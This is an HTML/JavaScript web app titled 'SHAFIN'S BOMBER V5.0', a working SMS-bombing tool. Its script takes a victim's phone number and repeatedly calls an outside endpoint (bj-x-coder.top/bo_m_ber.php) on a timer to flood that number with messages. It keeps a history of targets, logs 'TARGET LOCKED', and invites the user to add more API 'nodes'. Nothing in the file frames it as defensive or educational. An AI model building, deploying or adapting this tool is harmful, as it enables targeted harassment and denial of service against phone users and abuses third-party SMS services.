<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#000000">
  <title>SHAFIN'S BOMBER V5.0 (MULTI-NODE)</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">

  <style>
    :root {
      --primary: #00ff41;
      --dim: #008F11;
      --alert: #ff3333;
      --bg: #050505;
      --panel: rgba(0, 10, 0, 0.95);
      --glass: blur(5px);
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--primary);
      font-family: "Share Tech Mono", monospace;
      height: 100dvh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    /* Matrix Background */
    canvas#matrix {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -1;
      opacity: 0.15;
    }

    /* Main Container */
    .app-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      max-width: 600px;
      margin: 0 auto;
      width: 100%;
      background: var(--panel);
      backdrop-filter: var(--glass);
      -webkit-backdrop-filter: var(--glass);
      border-left: 1px solid #003300;
      border-right: 1px solid #003300;
      box-shadow: 0 0 20px rgba(0,255,65,0.1);
      position: relative;
    }

    /* Header */
    .header {
      padding: 15px;
      background: rgba(0, 20, 0, 0.9);
      border-bottom: 1px solid var(--dim);
      text-align: center;
      flex-shrink: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .title {
      font-size: 1.1rem;
      letter-spacing: 1px;
      text-shadow: 0 0 5px var(--primary);
      margin: 0;
    }
    .db-btn {
        background: transparent;
        border: 1px solid var(--dim);
        color: var(--dim);
        padding: 5px 10px;
        font-family: inherit;
        font-size: 0.8rem;
        cursor: pointer;
    }
    .db-btn:active { background: var(--dim); color: #000; }

    /* Scrollable Content */
    .content-scroll {
      flex: 1;
      overflow-y: auto;
      padding: 15px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    /* Radar Section */
    .visuals {
      position: relative;
      height: 160px;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      border: 1px dashed var(--dim);
      background: rgba(0,0,0,0.3);
      border-radius: 4px;
      flex-shrink: 0;
    }
    canvas#radar { width: 160px; height: 160px; }
    .geo-overlay {
      position: absolute;
      bottom: 5px; right: 5px;
      font-size: 0.65rem;
      color: var(--dim);
      text-align: right;
    }

    /* Stats Bar */
    .stats-bar {
        display: flex;
        justify-content: space-between;
        background: #001100;
        padding: 5px 10px;
        font-size: 0.8rem;
        border: 1px solid var(--dim);
        margin-bottom: 5px;
    }
    .stat-box span { color: #fff; font-weight: bold; }

    /* Controls */
    .controls { display: flex; flex-direction: column; gap: 15px; }
    
    .input-group { position: relative; }
    .input-group label {
      position: absolute;
      top: -8px; left: 10px;
      background: #000;
      padding: 0 5px;
      font-size: 0.75rem;
      color: var(--dim);
    }
    
    input {
      width: 100%;
      background: rgba(0, 20, 0, 0.5);
      border: 1px solid var(--dim);
      color: var(--primary);
      padding: 15px;
      font-family: inherit;
      font-size: 1.1rem;
      border-radius: 4px;
      transition: 0.3s;
    }
    input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 10px rgba(0,255,65,0.2);
      background: rgba(0, 30, 0, 0.8);
    }

    /* Buttons */
    .btn-row { display: flex; gap: 10px; margin-top: 5px; }
    
    button {
      flex: 1;
      padding: 18px;
      font-family: inherit;
      font-weight: bold;
      font-size: 1rem;
      text-transform: uppercase;
      cursor: pointer;
      border: none;
      border-radius: 2px;
    }

    .btn-start {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 15px rgba(0,255,65,0.3);
    }
    .btn-start:active { transform: scale(0.97); }
    .btn-start:disabled { background: #1a4d1a; color: #000; opacity: 0.7; }

    .btn-stop {
      background: transparent;
      border: 1px solid var(--alert);
      color: var(--alert);
    }
    .btn-stop:active { background: var(--alert); color: #000; }

    /* Terminal Footer */
    .terminal {
      height: 120px;
      background: #000;
      border-top: 1px solid var(--dim);
      padding: 10px;
      font-size: 0.75rem;
      overflow-y: auto;
      flex-shrink: 0;
      font-family: monospace;
    }
    .log-line { margin-bottom: 3px; border-left: 2px solid transparent; padding-left: 5px; }
    .log-sys { color: #ffff00; border-color: #ffff00; }
    .log-sent { color: #aaffaa; border-color: var(--primary); }
    .log-err { color: var(--alert); border-color: var(--alert); }
    .log-node { color: #00ffff; border-color: #00ffff; }

    /* --- HISTORY MODAL --- */
    #historyPanel {
        position: absolute;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.95);
        z-index: 100;
        display: none;
        flex-direction: column;
        padding: 20px;
    }
    #historyPanel.active { display: flex; }
    
    .history-header {
        display: flex;
        justify-content: space-between;
        border-bottom: 2px solid var(--primary);
        padding-bottom: 10px;
        margin-bottom: 10px;
    }
    .close-btn { 
        background: var(--alert); color: #000; border: none; padding: 5px 15px; 
        font-weight: bold; font-family: inherit;
    }
    
    .history-list {
        flex: 1;
        overflow-y: auto;
        border: 1px solid #333;
    }
    
    .history-item {
        padding: 15px;
        border-bottom: 1px solid #222;
        color: #fff;
        display: flex;
        justify-content: space-between;
        cursor: pointer;
    }
    .history-item:active { background: #111; }
    .history-item span { color: var(--dim); font-size: 0.8rem; }
    .history-item strong { color: var(--primary); font-size: 1.1rem; }

    .clear-btn {
        margin-top: 10px;
        padding: 15px;
        background: transparent;
        border: 1px solid #555;
        color: #888;
        width: 100%;
        font-family: inherit;
    }

    /* Fix for small phones */
    @media (max-height: 600px) {
      .visuals { height: 100px; }
      canvas#radar { width: 100px; height: 100px; }
      .terminal { height: 80px; }
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="app-container">
  <!-- Header with Database Button -->
  <div class="header">
    <button class="db-btn" id="dbBtn">DB</button>
    <h1 class="title">SHAFIN V5 (MULTI)</h1>
    <div style="font-size:0.7rem; color:var(--dim);">NODES: <span id="nodeCount">1</span></div>
  </div>

  <div class="content-scroll">
    <div class="visuals">
      <canvas id="radar" width="200" height="200"></canvas>
      <div class="geo-overlay" id="geo-info">
        TARGET: UNKNOWN<br>LOCATING...
      </div>
    </div>

    <div class="stats-bar">
        <div class="stat-box">SENT: <span id="sentCount">0</span></div>
        <div class="stat-box">LIMIT: <span id="limitCount">∞</span></div>
    </div>

    <div class="controls">
      <div class="input-group">
        <label>TARGET NUMBER</label>
        <input id="phone" type="tel" inputmode="numeric" placeholder="017XXXXXXXX" maxlength="11" />
      </div>

      <div class="input-group">
        <label>AMOUNT</label>
        <input id="amount" type="number" inputmode="numeric" placeholder="Unlimited" />
      </div>

      <div class="input-group">
        <label>DELAY (MS)</label>
        <input id="speed" type="number" inputmode="numeric" value="1500" placeholder="1000" />
      </div>

      <div class="btn-row">
        <button id="startBtn" class="btn-start">INITIATE</button>
        <button id="stopBtn" class="btn-stop">ABORT</button>
      </div>
    </div>
  </div>

  <div class="terminal" id="console">
    <div class="log-line log-sys">> SYSTEM READY. NODES LOADED.</div>
  </div>

  <!-- History Panel Modal -->
  <div id="historyPanel">
      <div class="history-header">
          <span style="font-size:1.2rem; margin-top:5px;">TARGET LOGS</span>
          <button class="close-btn" id="closeDb">X</button>
      </div>
      <div class="history-list" id="historyList">
          <!-- Items will be injected here -->
      </div>
      <button class="clear-btn" id="clearDb">CLEAR DATABASE</button>
  </div>
</div>

<script>
// --- CONFIGURATION ---
let isRunning = false;
let attackTimer = null;
let packetsSent = 0;
let packetLimit = 0;
const PROTECTED_NUMS = ["01317087493"]; 

// --- API NODES (Add more here) ---
// Structure: A function that takes 'num' and returns the full URL
const apiNodes = [
    // Node 1: Primary
    (num) => `https://bj-x-coder.top/bo_m_ber.php?phone=${num}&amount=1`,
    
    // Node 2: Example/Placeholder (Replace with valid API)
    // (num) => `https://example-sms.com/api.php?target=${num}`,
    
    // Node 3: Another Placeholder
    // (num) => `https://another-api.net/sms?number=${num}`,
];

// --- DOM ELEMENTS ---
const ui = {
  phone: document.getElementById('phone'),
  amount: document.getElementById('amount'),
  speed: document.getElementById('speed'),
  console: document.getElementById('console'),
  startBtn: document.getElementById('startBtn'),
  stopBtn: document.getElementById('stopBtn'),
  sentDisplay: document.getElementById('sentCount'),
  limitDisplay: document.getElementById('limitCount'),
  nodeCountDisplay: document.getElementById('nodeCount'),
  // History UI
  dbBtn: document.getElementById('dbBtn'),
  historyPanel: document.getElementById('historyPanel'),
  historyList: document.getElementById('historyList'),
  closeDb: document.getElementById('closeDb'),
  clearDb: document.getElementById('clearDb')
};

// --- INITIALIZATION ---
window.addEventListener('DOMContentLoaded', () => {
  const lastPhone = localStorage.getItem('shafin_last_target');
  if(lastPhone) ui.phone.value = lastPhone;
  
  ui.nodeCountDisplay.innerText = apiNodes.length; // Show active nodes
  
  resizeMatrix();
  animateRadar();
  matrixLoop();
});

window.addEventListener('resize', resizeMatrix);

// --- HISTORY SYSTEM ---
function saveToHistory(phone) {
    let history = JSON.parse(localStorage.getItem('shafin_history') || "[]");
    history = history.filter(item => item.phone !== phone);
    const timestamp = new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString();
    history.unshift({ phone: phone, time: timestamp });
    if(history.length > 20) history.pop();
    localStorage.setItem('shafin_history', JSON.stringify(history));
    localStorage.setItem('shafin_last_target', phone);
}

function renderHistory() {
    const history = JSON.parse(localStorage.getItem('shafin_history') || "[]");
    ui.historyList.innerHTML = "";
    if(history.length === 0) {
        ui.historyList.innerHTML = "<div style='padding:20px; color:#555;'>NO DATA FOUND</div>";
        return;
    }
    history.forEach(item => {
        const div = document.createElement('div');
        div.className = 'history-item';
        div.innerHTML = `<strong>${item.phone}</strong><span>${item.time}</span>`;
        div.onclick = () => {
            ui.phone.value = item.phone;
            ui.historyPanel.classList.remove('active');
            log(`Loaded from DB: ${item.phone}`, 'sys');
        };
        ui.historyList.appendChild(div);
    });
}

// History Event Listeners
ui.dbBtn.onclick = () => { renderHistory(); ui.historyPanel.classList.add('active'); };
ui.closeDb.onclick = () => { ui.historyPanel.classList.remove('active'); };
ui.clearDb.onclick = () => {
    if(confirm("Clear all history?")) {
        localStorage.removeItem('shafin_history');
        renderHistory();
    }
};

// --- UTILITIES ---
function log(msg, type = 'sent') {
  const div = document.createElement('div');
  const time = new Date().toLocaleTimeString('en-US', {hour12:false, hour:"numeric", minute:"numeric", second:"numeric"});
  div.className = `log-line log-${type}`;
  div.innerHTML = `[${time}] ${msg}`;
  ui.console.appendChild(div);
  ui.console.scrollTop = ui.console.scrollHeight;
  if(ui.console.childElementCount > 50) ui.console.removeChild(ui.console.firstChild);
}

function vibrate(pattern) { if (navigator.vibrate) navigator.vibrate(pattern); }

// --- ATTACK LOGIC ---
ui.startBtn.addEventListener('click', () => {
  let phone = ui.phone.value.replace(/[^0-9]/g, '');
  const speed = parseInt(ui.speed.value) || 1500;
  packetLimit = parseInt(ui.amount.value) || 0; 

  if (PROTECTED_NUMS.includes(phone)) {
    log('ACCESS DENIED', 'err');
    vibrate(200);
    alert("Protected Number.");
    return;
  }

  if(phone.length < 11) {
    log('ERROR: Invalid Number', 'err');
    vibrate(200);
    return;
  }

  saveToHistory(phone);

  isRunning = true;
  packetsSent = 0;
  ui.sentDisplay.innerText = "0";
  ui.limitDisplay.innerText = packetLimit > 0 ? packetLimit : "∞";
  
  ui.startBtn.disabled = true;
  ui.startBtn.innerText = "RUNNING...";
  ui.phone.disabled = true;
  log(`TARGET LOCKED: ${phone}`, 'sys');
  vibrate(100);

  attackTimer = setInterval(() => {
    if(!isRunning) return;
    if(packetLimit > 0 && packetsSent >= packetLimit) {
      stopAttack("LIMIT REACHED");
      return;
    }
    sendPacket(phone);
  }, speed);
});

ui.stopBtn.addEventListener('click', () => { if(isRunning) stopAttack("ABORTED"); });

function stopAttack(reason) {
  isRunning = false;
  clearInterval(attackTimer);
  ui.startBtn.disabled = false;
  ui.startBtn.innerText = "INITIATE";
  ui.phone.disabled = false;
  log(`STOPPED: ${reason}`, 'err');
  vibrate(500);
}

// --- MULTI-NODE SENDER ---
async function sendPacket(phone) {
  // Randomly select an API Node
  const nodeIndex = Math.floor(Math.random() * apiNodes.length);
  const getUrl = apiNodes[nodeIndex]; // This is the function
  const url = getUrl(phone); // Generate URL with phone number

  try {
    await fetch(url, { mode: 'no-cors' }); 
    packetsSent++;
    ui.sentDisplay.innerText = packetsSent;
    log(`>> [NODE-${nodeIndex+1}] Request Sent`);
  } catch (e) {
    log(`[NODE-${nodeIndex+1}] Fail`, 'err');
  }
}

// --- VISUALIZATION: RADAR & MATRIX ---
const rCanvas = document.getElementById('radar');
const rCtx = rCanvas.getContext('2d');
let radarAngle = 0;

function animateRadar() {
  const w = rCanvas.width, h = rCanvas.height, cx = w/2, cy = h/2;
  rCtx.clearRect(0,0,w,h);
  rCtx.strokeStyle = 'rgba(0, 50, 0, 0.5)';
  rCtx.lineWidth = 1;
  rCtx.beginPath();
  rCtx.arc(cx, cy, w*0.2, 0, Math.PI*2);
  rCtx.arc(cx, cy, w*0.35, 0, Math.PI*2);
  rCtx.arc(cx, cy, w*0.48, 0, Math.PI*2);
  rCtx.stroke();
  
  rCtx.save();
  rCtx.translate(cx, cy);
  rCtx.rotate(radarAngle);
  const grad = rCtx.createLinearGradient(0, 0, w*0.5, 0);
  grad.addColorStop(0, 'rgba(0, 255, 65, 0)');
  grad.addColorStop(1, 'rgba(0, 255, 65, 0.5)');
  rCtx.fillStyle = grad;
  rCtx.beginPath(); rCtx.moveTo(0,0); rCtx.arc(0, 0, w*0.48, -0.2, 0.2); rCtx.fill();
  rCtx.restore();

  if(isRunning && Math.random() > 0.92) {
    const dist = (Math.random() * (w*0.4));
    const ang = Math.random() * Math.PI * 2;
    rCtx.fillStyle = '#ff3333';
    rCtx.fillRect(cx + Math.cos(ang) * dist, cy + Math.sin(ang) * dist, 3, 3);
  }
  radarAngle += 0.05;
  requestAnimationFrame(animateRadar);
}

const mC = document.getElementById("matrix");
const mCtx = mC.getContext("2d");
let drops = [];
const charSet = "01"; 

function resizeMatrix() {
  mC.height = window.innerHeight;
  mC.width = window.innerWidth;
  drops = Array(Math.floor(mC.width/20)).fill(1);
}

function matrixLoop() {
  mCtx.fillStyle = "rgba(0, 0, 0, 0.1)"; 
  mCtx.fillRect(0, 0, mC.width, mC.height);
  mCtx.fillStyle = "#0f3"; 
  mCtx.font = "16px monospace";
  drops.forEach((y, i) => {
    mCtx.fillText(charSet[Math.floor(Math.random() * charSet.length)], i * 20, y * 20);
    if (y * 20 > mC.height && Math.random() > 0.98) drops[i] = 0;
    drops[i]++;
  });
  requestAnimationFrame(matrixLoop);
}
</script>
</body>
</html>
